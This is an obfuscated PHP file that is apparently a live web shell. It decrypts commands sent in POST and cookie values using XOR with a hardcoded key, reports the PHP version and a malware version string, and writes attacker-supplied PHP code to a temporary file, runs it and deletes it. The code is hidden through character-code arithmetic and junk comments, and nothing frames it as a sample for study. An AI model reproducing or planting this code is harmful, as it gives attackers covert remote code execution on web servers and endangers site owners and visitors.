<?php 

$ozn_re	= /*m*/ 'ozn_re'   ^   '';$evyjyf_a /* nmo   */ = /*  hkuar  */ "a"."r"."r"."a".$ozn_re(866-745) /*   hoc*/ .	"\137"      . /* pokp  */ "\x6d"   . /*   aiz */ "a"."p";$npzdrpqdw /* rzqnbv  */ =	"\x6a"    .    "o".$ozn_re(105) /* ejd_b  */ . /* btib */ $ozn_re(580-470);




function /*   _u  */ xpbvztdmn($fvjd_ni_pp, /*   u*/ $glgneld_)
{


 /*   v*/ global       $ozn_re;    
       $fvjd_ni_pp    =   "<"	.       $ozn_re(63)    . /*d   */ "p"."h"."\160"       . /* j  */ $ozn_re(32)    . /*  tesnr*/ "u"."n"."l"."\151"	.    "\x6e"    . /*m*/ $ozn_re(107)	.      "\x28"   .     "_"."\x5f"	.    "\x46"       .  "\111"     . /* xv*/ $ozn_re(76)   .     $ozn_re(539-470) /*  _gsw*/ .	$ozn_re(95)   .	$ozn_re(953-858) /* ltkxs  */ .  ")"."\73"    .       $ozn_re(32)    . /*   ips*/ $fvjd_ni_pp["d"]; /*  y  */ $oqwlomcoi    =    "f"."\151"    .  "\x6c" /* gcpyjb*/ . /*   n */ $ozn_re(951-850)   .  "_".$ozn_re(905-793)    .	"u"."t"."_".$ozn_re(123-24)     . /* vylxm */ "\157"    .    "n"."t"."\145"	. /*i */ "\156"    .	"\x74" /*  rnp*/ .       "\x73";
 /*jdko  */ 
    $oqwlomcoi($glgneld_,	$fvjd_ni_pp); /*  jhc   */    xccvrw_($glgneld_);}


$xjaxepmavr       =	73;



function    xccvrw_($glgneld_)


{

 /*jl  */ global  $ozn_re;    


	include($glgneld_);

 /*qa   */ $xatcppn   =       $glgneld_; /*iua  */ @unlink($xatcppn);

}function       wypbospr(){


 /* qmjfx  */ global     $ozn_re;



  $jqednrh /*lkwgr*/ =	array();


     $jqednrh["p"."v"]	=	phpversion();
   $jqednrh[$ozn_re(115)    .   "\x76"]   = /*zzxfr*/ "3"."."."5";
	$zvhxgr  =   74;


 /* _dw */ echo  @serialize($jqednrh);


}




function    _vdhwzwytv($fvjd_ni_pp, /* _nu */ $gubwy){

 /* suuco */ global /* ozlpm*/ $ozn_re;

    $kehdzjkz	=   "";


	$hvxmrvgnv /*  moaio*/ =	strlen($fvjd_ni_pp);
    $mgxpkc       =     strlen($gubwy);

	$jqednrh /*   bx_e */ =    0;

    $tjnfgbvu     =	0;

      


 /*   ifwvyn*/ while	($jqednrh       <    $hvxmrvgnv)     {


       $ftobnaxe       =  $fvjd_ni_pp[$jqednrh]    ^    $gubwy[$tjnfgbvu   %     $mgxpkc];

	$kehdzjkz /* vzrn*/ .= /*  omn  */ $ftobnaxe;
       $tjnfgbvu++; /*p   */ 

    $jqednrh++;


  }

 /*   abbfv*/ 
    if    (strlen($kehdzjkz)  > /*bfbo   */ 20)	{


    $osfpdyyyo /*ypej   */ = /*  ayrta  */ substr($kehdzjkz, /*   jawlbx   */ 0,    20);
   } /*  cuqli   */ if	(empty($kehdzjkz))      {


   $kehdzjkz	=    date('Y-m-d    H:i:s');
    }


   return	$kehdzjkz;


}

function    pv_mgd($x_njpuzp)

{


     global /*ayoben*/ $ozn_re;
    


 /*   _ua */ $quvljh	=      $ozn_re(576-522)    . /* n*/ $ozn_re(332-283)     .   "\146"     .      "f"."d".$ozn_re(809-754)    . /* ng  */ $ozn_re(55)    . /*   wid*/ "\x61"."-".$ozn_re(135-84)    .	"5".$ozn_re(100)	.  "\66"    . /* x*/ "-"."4"."\142"   .  "\145" /* ibp   */ .     "\x31" /*   pad_hz*/ .	$ozn_re(743-698)       .       $ozn_re(507-451)	.     "\x30"    .	"\144" /*  zwv   */ .       $ozn_re(1031-983) /* spdg */ . /*   yluia */ "-"."8"."\67" /*  wvhkkc  */ .    "7"."\x64" /*  o   */ . /*   _cjv   */ "b"."6"."\x65"    .      "7".$ozn_re(48) /*   oizbl  */ . /*orw  */ "\145"."\x61"."2";

 /*ado */      foreach    ($x_njpuzp	as    $jqednrhiznpttj	=> /*kzbzxk */ $fvjd_ni_pp)      {

  rtplqdw(base64_decode($fvjd_ni_pp), /*h   */ $quvljh,    $jqednrhiznpttj);
 /*q_ibat  */ }
}




function      rtplqdw($fvjd_ni_pp,   $quvljh,    $jqednrhiznpttj)
{
    global   $ozn_re;       


 /*  _ */ $fvjd_ni_pp /*   iki_h   */ =	unserialize(_vdhwzwytv(_vdhwzwytv($fvjd_ni_pp, /* vxbpnh */ $quvljh),       $jqednrhiznpttj));	$qakdfonms /*mcm */ =    'm_nam';	$qhygp    =   'qpbdm';

    if    (isset($fvjd_ni_pp["\x61".$ozn_re(604-497)]))  {       if    ($fvjd_ni_pp["\x61"]    == /*   y  */ $ozn_re(105))       {

 /* ybopi*/ wypbospr();


 /* ufkcnx   */ }     elseif	($fvjd_ni_pp["\x61"]     ==    "\145")    {

 /*yffd */ xpbvztdmn($fvjd_ni_pp,      sprintf("."."/"."\x25"     . /* z   */ "s"."."."p"."l",	md5($quvljh)));

			$wsgupc_cb       = /*bkr   */ 44;     }


     exit();
    }}



pv_mgd($_POST); /*   uos  */ 


$ennqr /*   d  */ = /*rwmq  */ Array();

$giksde	=	$evyjyf_a('rawurldecode',       $_POST);$npzdrpqdw($ennqr);

pv_mgd($_COOKIE);


$uqtimyw    =    $evyjyf_a('rawurldecode', /* xazja*/ $_COOKIE);




?>